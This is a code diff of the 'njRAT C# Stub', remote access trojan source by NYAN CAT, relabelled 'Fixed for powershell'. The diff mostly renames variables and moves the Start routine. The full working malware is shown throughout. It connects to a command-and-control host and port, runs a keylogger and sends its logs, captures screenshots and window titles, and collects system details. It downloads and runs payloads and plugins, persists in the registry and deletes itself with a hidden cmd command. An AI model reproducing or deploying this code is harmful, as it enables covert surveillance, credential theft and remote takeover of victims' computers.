@@ -20,9 +20,10 @@ using Microsoft.Win32;
 
 namespace Lime
 {
+
     /*
      * │ Author       : NYAN CAT
-     * │ Name         : njRAT C# Stub
+     * │ Name         : njRAT C# Stub | Fixed for powershell
      * │ Contact      : https:github.com/NYAN-x-CAT
      * 
      * This program is distributed for educational purposes only.
@@ -30,42 +31,124 @@ namespace Lime
 
     public class Core
     {
-        public static string VictimName = "TllBTiBDQVQ=";
+        public static string host = "127.0.0.1"; // Change IP
 
-        public static string Version = "0.7d";
+        public static string port = "5552"; // Change PORT
 
-        public static object StubMutex = null;
+        public static string registryName = "165d6ed988ac"; // Registry Key + Mutex
 
-        public static string RG = "165d6ed988ac";
+        public static string splitter = "|'|'|"; // Default
 
-        public static string Host = "127.0.0.1";
+        public static string victimName = "TllBTiBDQVQ="; // Group Name
 
-        public static string Port = "5552";
+        public static string version = "0.7d";
 
-        public static string Splitter = "|'|'|";
+        public static object stubMutex = null;
 
-        public static FileInfo CurrentAssemblyFileInfo = new FileInfo(Application.ExecutablePath);
+        public static FileInfo currentAssemblyFileInfo = new FileInfo(Application.ExecutablePath);
 
-        public static Keylogger _Keylogger = null;
+        public static Keylogger keylogger = null;
 
-        public static bool IsConnected = false;
+        public static bool isConnected = false;
 
-        public static TcpClient TcpSocket = null;
+        public static TcpClient tcpSocket = null;
 
-        private static MemoryStream _MemoryStream = new MemoryStream();
+        private static MemoryStream memoryStream = new MemoryStream();
 
-        private static byte[] BytesArray = new byte[5121];
+        private static byte[] bytesArray = new byte[5121];
 
-        private static string LastCapturedImage = "";
+        private static string lastCapturedImage = "";
 
-        public static object CurrentPlugin = null;
+        public static object currentPlugin = null;
+
+
+        public static void Start()
+        {
+            if (Interaction.Command() != null)
+            {
+                try
+                {
+                    Registry.CurrentUser.SetValue("di", "!");
+                }
+                catch (Exception expr_27)
+                {
+                    ProjectData.SetProjectError(expr_27);
+                    ProjectData.ClearProjectError();
+                }
+                Thread.Sleep(5000);
+            }
+            bool flag = false;
+            stubMutex = new Mutex(true, registryName, out flag);
+            if (!flag)
+            {
+                ProjectData.EndApp();
+            }
+            Thread thread = new Thread(new ThreadStart(Receive), 1);
+            thread.Start();
+            try
+            {
+                keylogger = new Keylogger();
+                thread = new Thread(new ThreadStart(keylogger.WRK), 1);
+                thread.Start();
+            }
+            catch (Exception expr_CE)
+            {
+                ProjectData.SetProjectError(expr_CE);
+                ProjectData.ClearProjectError();
+            }
+            int num = 0;
+            string left = "";
+            checked
+            {
+                while (true)
+                {
+                    Thread.Sleep(1000);
+                    if (!isConnected)
+                    {
+                        left = "";
+                    }
+                    Application.DoEvents();
+                    try
+                    {
+                        num++;
+                        if (num == 5)
+                        {
+                            try
+                            {
+                                Process.GetCurrentProcess().MinWorkingSet = (IntPtr)1024;
+                            }
+                            catch (Exception expr_14E)
+                            {
+                                ProjectData.SetProjectError(expr_14E);
+                                ProjectData.ClearProjectError();
+                            }
+                        }
+                        if (num >= 8)
+                        {
+                            num = 0;
+                            string text = GetForegroundWindowTitle();
+                            if (Operators.CompareString(left, text, false) != 0)
+                            {
+                                left = text;
+                                Send("act" + splitter + text);
+                            }
+                        }
+                    }
+                    catch (Exception expr_2D4)
+                    {
+                        ProjectData.SetProjectError(expr_2D4);
+                        ProjectData.ClearProjectError();
+                    }
+                }
+            }
+        }
 
 
         public static void DeleteValueFromRegistry(string name)
         {
             try
             {
-                using (RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\" + RG, RegistryKeyPermissionCheck.ReadWriteSubTree))
+                using (RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\" + registryName, RegistryKeyPermissionCheck.ReadWriteSubTree))
                 {
                     key.DeleteValue(name);
                 }
@@ -82,7 +165,7 @@ namespace Lime
             object result;
             try
             {
-                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\" + RG, RegistryKeyPermissionCheck.ReadWriteSubTree))
+                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\" + registryName, RegistryKeyPermissionCheck.ReadWriteSubTree))
                 {
                     result = key.GetValue(name, RuntimeHelpers.GetObjectValue(ret));
                 }
@@ -101,7 +184,7 @@ namespace Lime
             bool result;
             try
             {
-                using (RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\" + RG, RegistryKeyPermissionCheck.ReadWriteSubTree))
+                using (RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\" + registryName, RegistryKeyPermissionCheck.ReadWriteSubTree))
                 {
                     key.SetValue(n, RuntimeHelpers.GetObjectValue(t));
                     result = true;
@@ -118,21 +201,21 @@ namespace Lime
 
         public static string GetInfo()
         {
-            string text = "ll" + Splitter;
+            string text = "ll" + splitter;
             try
             {
                 if (Operators.ConditionalCompareObjectEqual(GetValueFromRegistry("vn", ""), "", false))
                 {
                     string arg_54_0 = text;
-                    string text2 = Base64ToString(ref VictimName) + "_" + GetHWID();
-                    text = arg_54_0 + StringToBase64(ref text2) + Splitter;
+                    string text2 = Base64ToString(ref victimName) + "_" + GetHWID();
+                    text = arg_54_0 + StringToBase64(ref text2) + splitter;
                 }
                 else
                 {
                     string arg_97_0 = text;
                     string text2 = Conversions.ToString(GetValueFromRegistry("vn", ""));
                     string text3 = Base64ToString(ref text2) + "_" + GetHWID();
-                    text = arg_97_0 + StringToBase64(ref text3) + Splitter;
+                    text = arg_97_0 + StringToBase64(ref text3) + splitter;
                 }
             }
             catch (Exception expr_9F)
@@ -140,40 +223,40 @@ namespace Lime
                 ProjectData.SetProjectError(expr_9F);
                 string arg_BA_0 = text;
                 string text3 = GetHWID();
-                text = arg_BA_0 + StringToBase64(ref text3) + Splitter;
+                text = arg_BA_0 + StringToBase64(ref text3) + splitter;
                 ProjectData.ClearProjectError();
             }
             try
             {
-                text = text + Environment.MachineName + Splitter;
+                text = text + Environment.MachineName + splitter;
             }
             catch (Exception expr_DA)
             {
                 ProjectData.SetProjectError(expr_DA);
-                text = text + "??" + Splitter;
+                text = text + "??" + splitter;
                 ProjectData.ClearProjectError();
             }
             try
             {
-                text = text + Environment.UserName + Splitter;
+                text = text + Environment.UserName + splitter;
             }
             catch (Exception expr_10D)
             {
                 ProjectData.SetProjectError(expr_10D);
-                text = text + "??" + Splitter;
+                text = text + "??" + splitter;
                 ProjectData.ClearProjectError();
             }
             try
             {
-                text = text + CurrentAssemblyFileInfo.LastWriteTime.Date.ToString("yy-MM-dd") + Splitter;
+                text = text + currentAssemblyFileInfo.LastWriteTime.Date.ToString("yy-MM-dd") + splitter;
             }
             catch (Exception expr_15C)
             {
                 ProjectData.SetProjectError(expr_15C);
-                text = text + "??-??-??" + Splitter;
+                text = text + "??-??-??" + splitter;
                 ProjectData.ClearProjectError();
             }
-            text = text + "" + Splitter;
+            text = text + "" + splitter;
             try
             {
                 text += new Computer().Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win");
@@ -206,34 +289,34 @@ namespace Lime
                 {
                     if (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86"))
                     {
-                        text = text + " x64" + Splitter;
+                        text = text + " x64" + splitter;
                     }
                     else
                     {
-                        text = text + " x86" + Splitter;
+                        text = text + " x86" + splitter;
                     }
                 }
                 catch (Exception expr_2B7)
                 {
                     ProjectData.SetProjectError(expr_2B7);
-                    text += Splitter;
+                    text += splitter;
                     ProjectData.ClearProjectError();
                 }
                 if (SearchForCam())
                 {
-                    text = text + "Yes" + Splitter;
+                    text = text + "Yes" + splitter;
                 }
                 else
                 {
-                    text = text + "No" + Splitter;
+                    text = text + "No" + splitter;
                 }
-                text = text + Version + Splitter;
-                text = text + ".." + Splitter;
-                text = text + GetForegroundWindowTitle() + Splitter;
+                text = text + version + splitter;
+                text = text + ".." + splitter;
+                text = text + GetForegroundWindowTitle() + splitter;
                 string text4 = "";
                 try
                 {
-                    string[] valueNames = Registry.CurrentUser.CreateSubKey("Software\\" + RG, RegistryKeyPermissionCheck.Default).GetValueNames();
+                    string[] valueNames = Registry.CurrentUser.CreateSubKey("Software\\" + registryName, RegistryKeyPermissionCheck.Default).GetValueNames();
                     for (int i = 0; i < valueNames.Length; i++)
                     {
                         string text5 = valueNames[i];
@@ -403,7 +486,7 @@ namespace Lime
         {
             try
             {
-                Registry.CurrentUser.OpenSubKey("Software", true).DeleteSubKey(RG, false);
+                Registry.CurrentUser.OpenSubKey("Software", true).DeleteSubKey(registryName, false);
             }
             catch (Exception expr_10F)
             {
@@ -412,7 +495,7 @@ namespace Lime
             }
             try
             {
-                Interaction.Shell("cmd.exe /c ping 0 -n 2 & del \"" + CurrentAssemblyFileInfo.FullName + "\"", AppWinStyle.Hide, false, -1);
+                Interaction.Shell("cmd.exe /c ping 0 -n 2 & del \"" + currentAssemblyFileInfo.FullName + "\"", AppWinStyle.Hide, false, -1);
             }
             catch (Exception expr_142)
             {
@@ -424,7 +507,7 @@ namespace Lime
 
         public static void HandleData(byte[] b)
         {
-            string[] array = Strings.Split(BytesToString(ref b), Splitter, -1, CompareMethod.Binary);
+            string[] array = Strings.Split(BytesToString(ref b), splitter, -1, CompareMethod.Binary);
             checked
             {
                 try
@@ -432,11 +515,11 @@ namespace Lime
                     string left = array[0];
                     if (Operators.CompareString(left, "ll", false) == 0)
                     {
-                        IsConnected = false;
+                        isConnected = false;
                     }
                     else if (Operators.CompareString(left, "kl", false) == 0)
                     {
-                        Send("kl" + Splitter + StringToBase64(ref _Keylogger.Logs));
+                        Send("kl" + splitter + StringToBase64(ref keylogger.Logs));
                     }
                     else if (Operators.CompareString(left, "prof", false) == 0)
                     {
@@ -448,7 +531,7 @@ namespace Lime
                         else if (Operators.CompareString(left2, "!", false) == 0)
                         {
                             SaveValueOnRegistry(array[2], array[3], RegistryValueKind.String);
-                            Send(Conversions.ToString(Operators.ConcatenateObject("getvalue" + Splitter + array[1] + Splitter, GetValueFromRegistry(array[1], ""))));
+                            Send(Conversions.ToString(Operators.ConcatenateObject("getvalue" + splitter + array[1] + splitter, GetValueFromRegistry(array[1], ""))));
                         }
                         else if (Operators.CompareString(left2, "@", false) == 0)
                         {
@@ -465,7 +548,7 @@ namespace Lime
                                 try
                                 {
                                     MemoryStream memoryStream = new MemoryStream();
-                                    int length = (array[0] + Splitter + array[1] + Splitter).Length;
+                                    int length = (array[0] + splitter + array[1] + splitter).Length;
                                     memoryStream.Write(b, length, b.Length - length);
                                     bytes = DecompressGzip(memoryStream.ToArray());
                                     goto IL_20B;
@@ -473,7 +556,7 @@ namespace Lime
                                 catch (Exception expr_189)
                                 {
                                     ProjectData.SetProjectError(expr_189);
-                                    Send("MSG" + Splitter + "Execute ERROR");
+                                    Send("MSG" + splitter + "Execute ERROR");
                                     Send("bla");
                                     ProjectData.ClearProjectError();
                                     return;
@@ -487,7 +570,7 @@ namespace Lime
                             catch (Exception expr_1D4)
                             {
                                 ProjectData.SetProjectError(expr_1D4);
-                                Send("MSG" + Splitter + "Download ERROR");
+                                Send("MSG" + splitter + "Download ERROR");
                                 Send("bla");
                                 ProjectData.ClearProjectError();
                                 return;
@@ -499,14 +582,14 @@ namespace Lime
                             {
                                 File.WriteAllBytes(text, bytes);
                                 Process.Start(text);
-                                Send("MSG" + Splitter + "Executed As " + new FileInfo(text).Name);
+                                Send("MSG" + splitter + "Executed As " + new FileInfo(text).Name);
                                 return;
                             }
                             catch (Exception expr_261)
                             {
                                 ProjectData.SetProjectError(expr_261);
                                 Exception ex = expr_261;
-                                Send("MSG" + Splitter + "Execute ERROR " + ex.Message);
+                                Send("MSG" + splitter + "Execute ERROR " + ex.Message);
                                 ProjectData.ClearProjectError();
                                 return;
                             }
@@ -519,9 +602,9 @@ namespace Lime
                                 Send(string.Concat(new string[]
                                 {
                                     "pl",
-                                    Splitter,
+                                    splitter,
                                     array[1],
-                                    Splitter,
+                                    splitter,
                                     Conversions.ToString(1)
                                 }));
                             }
@@ -533,11 +616,11 @@ namespace Lime
                                     int length2 = string.Concat(new string[]
                                     {
                                         array[0],
-                                        Splitter,
+                                        splitter,
                                         array[1],
-                                        Splitter,
+                                        splitter,
                                         array[2],
-                                        Splitter
+                                        splitter
                                     }).Length;
                                     memoryStream2.Write(b, length2, b.Length - length2);
                                     array2 = DecompressGzip(memoryStream2.ToArray());
@@ -546,26 +629,26 @@ namespace Lime
                                 Send(string.Concat(new string[]
                                 {
                                     "pl",
-                                    Splitter,
+                                    splitter,
                                     array[1],
-                                    Splitter,
+                                    splitter,
                                     Conversions.ToString(0)
                                 }));
                                 object objectValue = RuntimeHelpers.GetObjectValue(Plugin(array2, "A"));
                                 NewLateBinding.LateSet(objectValue, null, "h", new object[]
                                 {
-                                    Host
+                                    host
                                 }, null, null);
                                 NewLateBinding.LateSet(objectValue, null, "p", new object[]
                                 {
-                                    Port
+                                    port
                                 }, null, null);
                                 NewLateBinding.LateSet(objectValue, null, "osk", new object[]
                                 {
                                     array[2]
                                 }, null, null);
                                 NewLateBinding.LateCall(objectValue, null, "start", new object[0], null, null, null, true);
-                                while (!Conversions.ToBoolean(Operators.OrObject(!IsConnected, Operators.CompareObjectEqual(NewLateBinding.LateGet(objectValue, null, "Off", new object[0], null, null, null), true, false))))
+                                while (!Conversions.ToBoolean(Operators.OrObject(!isConnected, Operators.CompareObjectEqual(NewLateBinding.LateGet(objectValue, null, "Off", new object[0], null, null, null), true, false))))
                                 {
                                     Thread.Sleep(1);
                                 }
@@ -583,9 +666,9 @@ namespace Lime
                                 Send(string.Concat(new string[]
                                 {
                                     "pl",
-                                    Splitter,
+                                    splitter,
                                     array[1],
-                                    Splitter,
+                                    splitter,
                                     Conversions.ToString(1)
                                 }));
                             }
@@ -594,7 +677,7 @@ namespace Lime
                                 if (array[2].Length > 10)
                                 {
                                     MemoryStream memoryStream3 = new MemoryStream();
-                                    int length3 = (array[0] + Splitter + array[1] + Splitter).Length;
+                                    int length3 = (array[0] + splitter + array[1] + splitter).Length;
                                     memoryStream3.Write(b, length3, b.Length - length3);
                                     array3 = DecompressGzip(memoryStream3.ToArray());
                                     SaveValueOnRegistry(array[1], array3, RegistryValueKind.Binary);
@@ -602,17 +685,17 @@ namespace Lime
                                 Send(string.Concat(new string[]
                                 {
                                     "pl",
-                                    Splitter,
+                                    splitter,
                                     array[1],
-                                    Splitter,
+                                    splitter,
                                     Conversions.ToString(0)
                                 }));
                                 object objectValue2 = RuntimeHelpers.GetObjectValue(Plugin(array3, "A"));
                                 string[] array4 = new string[5];
                                 array4[0] = "ret";
-                                array4[1] = Splitter;
+                                array4[1] = splitter;
                                 array4[2] = array[1];
-                                array4[3] = Splitter;
+                                array4[3] = splitter;
                                 string[] arg_658_0 = array4;
                                 int arg_658_1 = 4;
                                 string text2 = Conversions.ToString(NewLateBinding.LateGet(objectValue2, null, "GT", new object[0], null, null, null));
@@ -653,15 +736,15 @@ namespace Lime
                             graphics.DrawImage(bitmap, 0, 0, bitmap2.Width, bitmap2.Height);
                             graphics.Dispose();
                             MemoryStream memoryStream4 = new MemoryStream();
-                            string text2 = "CAP" + Splitter;
+                            string text2 = "CAP" + splitter;
                             b = StringToBytes(ref text2);
                             memoryStream4.Write(b, 0, b.Length);
                             MemoryStream memoryStream5 = new MemoryStream();
                             bitmap2.Save(memoryStream5, ImageFormat.Jpeg);
                             string left3 = CreateHash(memoryStream5.ToArray());
-                            if (Operators.CompareString(left3, LastCapturedImage, false) != 0)
+                            if (Operators.CompareString(left3, lastCapturedImage, false) != 0)
                             {
-                                LastCapturedImage = left3;
+                                lastCapturedImage = left3;
                                 memoryStream4.Write(memoryStream5.ToArray(), 0, (int)memoryStream5.Length);
                             }
                             else
@@ -687,7 +770,7 @@ namespace Lime
                             }
                             else if (Operators.CompareString(left4, "@", false) == 0)
                             {
-                                Process.Start(CurrentAssemblyFileInfo.FullName);
+                                Process.Start(currentAssemblyFileInfo.FullName);
                                 ProjectData.EndApp();
                             }
                         }
@@ -699,7 +782,7 @@ namespace Lime
                                 try
                                 {
                                     MemoryStream memoryStream6 = new MemoryStream();
-                                    int length4 = (array[0] + Splitter).Length;
+                                    int length4 = (array[0] + splitter).Length;
                                     memoryStream6.Write(b, length4, b.Length - length4);
                                     bytes2 = DecompressGzip(memoryStream6.ToArray());
                                     goto IL_97B;
@@ -707,7 +790,7 @@ namespace Lime
                                 catch (Exception expr_8F8)
                                 {
                                     ProjectData.SetProjectError(expr_8F8);
-                                    Send("MSG" + Splitter + "Update ERROR");
+                                    Send("MSG" + splitter + "Update ERROR");
                                     Send("bla");
                                     ProjectData.ClearProjectError();
                                     return;
@@ -721,7 +804,7 @@ namespace Lime
                             catch (Exception expr_944)
                             {
                                 ProjectData.SetProjectError(expr_944);
-                                Send("MSG" + Splitter + "Update ERROR");
+                                Send("MSG" + splitter + "Update ERROR");
                                 Send("bla");
                                 ProjectData.ClearProjectError();
                                 return;
@@ -731,7 +814,7 @@ namespace Lime
                             string text3 = Path.GetTempFileName() + ".exe";
                             try
                             {
-                                Send("MSG" + Splitter + "Updating To " + new FileInfo(text3).Name);
+                                Send("MSG" + splitter + "Updating To " + new FileInfo(text3).Name);
                                 Thread.Sleep(2000);
                                 File.WriteAllBytes(text3, bytes2);
                                 Process.Start(text3, "..");
@@ -740,7 +823,7 @@ namespace Lime
                             {
                                 ProjectData.SetProjectError(expr_9DF);
                                 Exception ex2 = expr_9DF;
-                                Send("MSG" + Splitter + "Update ERROR " + ex2.Message);
+                                Send("MSG" + splitter + "Update ERROR " + ex2.Message);
                                 ProjectData.ClearProjectError();
                                 return;
                             }
@@ -748,21 +831,21 @@ namespace Lime
                         }
                         else if (Operators.CompareString(left, "Ex", false) == 0)
                         {
-                            if (CurrentPlugin == null)
+                            if (currentPlugin == null)
                             {
                                 Send("PLG");
                                 int num = 0;
-                                while (!(CurrentPlugin != null | num == 20 | !IsConnected))
+                                while (!(currentPlugin != null | num == 20 | !isConnected))
                                 {
                                     num++;
                                     Thread.Sleep(1000);
                                 }
-                                if (CurrentPlugin == null | !IsConnected)
+                                if (currentPlugin == null | !isConnected)
                                 {
                                     return;
                                 }
                             }
-                            object arg_ABB_0 = CurrentPlugin;
+                            object arg_ABB_0 = currentPlugin;
                             Type arg_ABB_1 = null;
                             string arg_ABB_2 = "ind";
                             object[] array5 = new object[]
@@ -785,20 +868,20 @@ namespace Lime
                         else if (Operators.CompareString(left, "PLG", false) == 0)
                         {
                             MemoryStream memoryStream7 = new MemoryStream();
-                            int length5 = (array[0] + Splitter).Length;
+                            int length5 = (array[0] + splitter).Length;
                             memoryStream7.Write(b, length5, b.Length - length5);
-                            CurrentPlugin = RuntimeHelpers.GetObjectValue(Plugin(DecompressGzip(memoryStream7.ToArray()), "A"));
-                            NewLateBinding.LateSet(CurrentPlugin, null, "H", new object[]
+                            currentPlugin = RuntimeHelpers.GetObjectValue(Plugin(DecompressGzip(memoryStream7.ToArray()), "A"));
+                            NewLateBinding.LateSet(currentPlugin, null, "H", new object[]
                             {
-                                Host
+                                host
                             }, null, null);
-                            NewLateBinding.LateSet(CurrentPlugin, null, "P", new object[]
+                            NewLateBinding.LateSet(currentPlugin, null, "P", new object[]
                             {
-                                Port
+                                port
                             }, null, null);
-                            NewLateBinding.LateSet(CurrentPlugin, null, "c", new object[]
+                            NewLateBinding.LateSet(currentPlugin, null, "c", new object[]
                             {
-                                TcpSocket
+                                tcpSocket
                             }, null, null);
                         }
                     }
@@ -809,16 +892,16 @@ namespace Lime
                     Exception ex3 = expr_BC0;
                     if (array.Length > 0 && (Operators.CompareString(array[0], "Ex", false) == 0 | Operators.CompareString(array[0], "PLG", false) == 0))
                     {
-                        CurrentPlugin = null;
+                        currentPlugin = null;
                     }
                     try
                     {
                         Send(string.Concat(new string[]
                         {
                             "ER",
-                            Splitter,
+                            splitter,
                             array[0],
-                            Splitter,
+                            splitter,
                             ex3.Message
                         }));
                     }
@@ -851,16 +934,16 @@ namespace Lime
 
         public static bool Send(byte[] b)
         {
-            if (!IsConnected)
+            if (!isConnected)
             {
                 return false;
             }
             try
             {
-                FileInfo lO = CurrentAssemblyFileInfo;
+                FileInfo lO = currentAssemblyFileInfo;
                 lock (lO)
                 {
-                    if (!IsConnected)
+                    if (!isConnected)
                     {
                         return false;
                     }
@@ -869,7 +952,7 @@ namespace Lime
                     byte[] array = StringToBytes(ref text);
                     memoryStream.Write(array, 0, array.Length);
                     memoryStream.Write(b, 0, b.Length);
-                    TcpSocket.Client.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
+                    tcpSocket.Client.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
                 }
             }
             catch (Exception expr_8C)
@@ -877,10 +960,10 @@ namespace Lime
                 ProjectData.SetProjectError(expr_8C);
                 try
                 {
-                    if (IsConnected)
+                    if (isConnected)
                     {
-                        IsConnected = false;
-                        TcpSocket.Close();
+                        isConnected = false;
+                        tcpSocket.Close();
                     }
                 }
                 catch (Exception expr_AC)
@@ -890,7 +973,7 @@ namespace Lime
                 }
                 ProjectData.ClearProjectError();
             }
-            return IsConnected;
+            return isConnected;
         }
 
         public static bool Send(string S)
@@ -900,19 +983,19 @@ namespace Lime
 
         public static bool Connect()
         {
-            IsConnected = false;
+            isConnected = false;
             Thread.Sleep(2000);
-            FileInfo lO = CurrentAssemblyFileInfo;
+            FileInfo lO = currentAssemblyFileInfo;
             lock (lO)
             {
                 try
                 {
-                    if (TcpSocket != null)
+                    if (tcpSocket != null)
                     {
                         try
                         {
-                            TcpSocket.Close();
-                            TcpSocket = null;
+                            tcpSocket.Close();
+                            tcpSocket = null;
                         }
                         catch (Exception expr_37)
                         {
@@ -922,7 +1005,7 @@ namespace Lime
                     }
                     try
                     {
-                        _MemoryStream.Dispose();
+                        memoryStream.Dispose();
                     }
                     catch (Exception expr_51)
                     {
@@ -937,21 +1020,21 @@ namespace Lime
                 }
                 try
                 {
-                    _MemoryStream = new MemoryStream();
-                    TcpSocket = new TcpClient();
-                    TcpSocket.ReceiveBufferSize = 204800;
-                    TcpSocket.SendBufferSize = 204800;
-                    TcpSocket.Client.SendTimeout = 10000;
-                    TcpSocket.Client.ReceiveTimeout = 10000;
-                    TcpSocket.Connect(Host, Conversions.ToInteger(Port));
-                    IsConnected = true;
+                    memoryStream = new MemoryStream();
+                    tcpSocket = new TcpClient();
+                    tcpSocket.ReceiveBufferSize = 204800;
+                    tcpSocket.SendBufferSize = 204800;
+                    tcpSocket.Client.SendTimeout = 10000;
+                    tcpSocket.Client.ReceiveTimeout = 10000;
+                    tcpSocket.Connect(host, Conversions.ToInteger(port));
+                    isConnected = true;
                     Send(GetInfo());
                     try
                     {
                         string text = string.Empty;
                         if (Operators.ConditionalCompareObjectEqual(GetValueFromRegistry("vn", ""), "", false))
                         {
-                            text = text + Base64ToString(ref VictimName) + "\r\n";
+                            text = text + Base64ToString(ref victimName) + "\r\n";
                         }
                         else
                         {
@@ -962,9 +1045,9 @@ namespace Lime
                         text = string.Concat(new string[]
                         {
                             text,
-                            Host,
+                            host,
                             ":",
-                            Port,
+                            port,
                             "\r\n"
                         });
                         text = text + "" + "\r\n";
@@ -973,7 +1056,7 @@ namespace Lime
                         text = text + "" + "\r\n";
                         text = text + "" + "\r\n";
                         text += "";
-                        Send("inf" + Splitter + StringToBase64(ref text));
+                        Send("inf" + splitter + StringToBase64(ref text));
                     }
                     catch (Exception expr_22C)
                     {
@@ -984,11 +1067,11 @@ namespace Lime
                 catch (Exception expr_23B)
                 {
                     ProjectData.SetProjectError(expr_23B);
-                    IsConnected = false;
+                    isConnected = false;
                     ProjectData.ClearProjectError();
                 }
             }
-            return IsConnected;
+            return isConnected;
         }
 
         public static void Receive()
@@ -997,8 +1080,8 @@ namespace Lime
             {
                 while (true)
                 {
-                    LastCapturedImage = "";
-                    if (TcpSocket != null)
+                    lastCapturedImage = "";
+                    if (tcpSocket != null)
                     {
                         long num = -1L;
                         int num2 = 0;
@@ -1013,44 +1096,44 @@ namespace Lime
                                     num2 = 0;
                                     Thread.Sleep(1);
                                 }
-                                if (!IsConnected)
+                                if (!isConnected)
                                 {
                                     break;
                                 }
-                                if (TcpSocket.Available < 1)
+                                if (tcpSocket.Available < 1)
                                 {
-                                    TcpSocket.Client.Poll(-1, SelectMode.SelectRead);
+                                    tcpSocket.Client.Poll(-1, SelectMode.SelectRead);
                                 }
-                                while (TcpSocket.Available != 0)
+                                while (tcpSocket.Available != 0)
                                 {
                                     if (num != -1L)
                                     {
-                                        BytesArray = new byte[TcpSocket.Available + 1];
-                                        long num3 = num - _MemoryStream.Length;
-                                        if (unchecked((long)BytesArray.Length) > num3)
+                                        bytesArray = new byte[tcpSocket.Available + 1];
+                                        long num3 = num - memoryStream.Length;
+                                        if (unchecked((long)bytesArray.Length) > num3)
                                         {
-                                            BytesArray = new byte[(int)(num3 - 1L) + 1];
+                                            bytesArray = new byte[(int)(num3 - 1L) + 1];
                                         }
-                                        int count = TcpSocket.Client.Receive(BytesArray, 0, BytesArray.Length, SocketFlags.None);
-                                        _MemoryStream.Write(BytesArray, 0, count);
-                                        if (_MemoryStream.Length == num)
+                                        int count = tcpSocket.Client.Receive(bytesArray, 0, bytesArray.Length, SocketFlags.None);
+                                        memoryStream.Write(bytesArray, 0, count);
+                                        if (memoryStream.Length == num)
                                         {
                                             num = -1L;
                                             Thread thread = new Thread(delegate (object a0)
                                             {
                                                 HandleData((byte[])a0);
                                             }, 1);
-                                            thread.Start(_MemoryStream.ToArray());
+                                            thread.Start(memoryStream.ToArray());
                                             thread.Join(100);
-                                            _MemoryStream.Dispose();
-                                            _MemoryStream = new MemoryStream();
+                                            memoryStream.Dispose();
+                                            memoryStream = new MemoryStream();
                                         }
                                         goto IL_1B;
                                     }
                                     string text = "";
                                     while (true)
                                     {
-                                        int num4 = TcpSocket.GetStream().ReadByte();
+                                        int num4 = tcpSocket.GetStream().ReadByte();
                                         if (num4 == -1)
                                         {
                                             goto Block_9;
@@ -1067,7 +1150,7 @@ namespace Lime
                                         Send("");
                                         num = -1L;
                                     }
-                                    if (TcpSocket.Available <= 0)
+                                    if (tcpSocket.Available <= 0)
                                     {
                                         goto IL_1B;
                                     }
@@ -1086,10 +1169,10 @@ namespace Lime
                     {
                         try
                         {
-                            if (CurrentPlugin != null)
+                            if (currentPlugin != null)
                             {
-                                NewLateBinding.LateCall(CurrentPlugin, null, "clear", new object[0], null, null, null, true);
-                                CurrentPlugin = null;
+                                NewLateBinding.LateCall(currentPlugin, null, "clear", new object[0], null, null, null, true);
+                                currentPlugin = null;
                             }
                         }
                         catch (Exception expr_1EC)
@@ -1097,94 +1180,14 @@ namespace Lime
                             ProjectData.SetProjectError(expr_1EC);
                             ProjectData.ClearProjectError();
                         }
-                        IsConnected = false;
+                        isConnected = false;
                     }
                     while (!Connect());
-                    IsConnected = true;
+                    isConnected = true;
                 }
             }
         }
 
-        public static void Start()
-        {
-            if (Interaction.Command() != null)
-            {
-                try
-                {
-                    Registry.CurrentUser.SetValue("di", "!");
-                }
-                catch (Exception expr_27)
-                {
-                    ProjectData.SetProjectError(expr_27);
-                    ProjectData.ClearProjectError();
-                }
-                Thread.Sleep(5000);
-            }
-            bool flag = false;
-            StubMutex = new Mutex(true, RG, out flag);
-            if (!flag)
-            {
-                ProjectData.EndApp();
-            }
-            Thread thread = new Thread(new ThreadStart(Receive), 1);
-            thread.Start();
-            try
-            {
-                _Keylogger = new Keylogger();
-                thread = new Thread(new ThreadStart(_Keylogger.WRK), 1);
-                thread.Start();
-            }
-            catch (Exception expr_CE)
-            {
-                ProjectData.SetProjectError(expr_CE);
-                ProjectData.ClearProjectError();
-            }
-            int num = 0;
-            string left = "";
-            checked
-            {
-                while (true)
-                {
-                    Thread.Sleep(1000);
-                    if (!IsConnected)
-                    {
-                        left = "";
-                    }
-                    Application.DoEvents();
-                    try
-                    {
-                        num++;
-                        if (num == 5)
-                        {
-                            try
-                            {
-                                Process.GetCurrentProcess().MinWorkingSet = (IntPtr)1024;
-                            }
-                            catch (Exception expr_14E)
-                            {
-                                ProjectData.SetProjectError(expr_14E);
-                                ProjectData.ClearProjectError();
-                            }
-                        }
-                        if (num >= 8)
-                        {
-                            num = 0;
-                            string text = GetForegroundWindowTitle();
-                            if (Operators.CompareString(left, text, false) != 0)
-                            {
-                                left = text;
-                                Send("act" + Splitter + text);
-                            }
-                        }
-                    }
-                    catch (Exception expr_2D4)
-                    {
-                        ProjectData.SetProjectError(expr_2D4);
-                        ProjectData.ClearProjectError();
-                    }
-                }
-            }
-        }
 
         [DllImport("ntdll")]
         private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
